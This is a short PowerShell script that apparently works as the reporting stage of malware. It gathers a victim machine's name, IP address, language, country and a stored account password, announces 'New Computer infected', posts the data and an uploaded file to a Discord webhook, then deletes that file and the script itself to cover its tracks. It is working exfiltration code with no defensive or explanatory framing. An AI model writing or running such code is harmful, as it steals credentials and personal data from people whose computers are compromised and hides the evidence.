## Get Webhook link from other file
param([string] $Webhook)

function upload_discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    
    $Body = @{
      'username' = $env:username
      'content' = $text
    }
    
    if (-not ([string]::IsNullOrEmpty($text))){
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $Webhook  -Method Post -Body ($Body | ConvertTo-Json)};
    
    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $Webhook}
    }

## Get all information for payload
$ip = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
$language = (Get-WinUserLanguageList)[0].autonym
$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
$country = $country.Substring(0, $country.length - 2)
$password = Get-ChildItem *.password | Select-Object BaseName

## Write Payload
$description = 
"
New Computer infected 
---------------------------------
Computer Name = $env:computername 
Computer Language = $language
Location (country) = $country
IP = $ip
Account Password = $password
"

## Make Payload ready for Discord
$payload = [PSCustomObject]@{content=$description}

## Send Message to Discord
Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
upload_discord("$env:computername.fk")

## Self Delete
Remove-Item ./"$env:computername.fk"
Remove-Item $PSCommandPath -Force 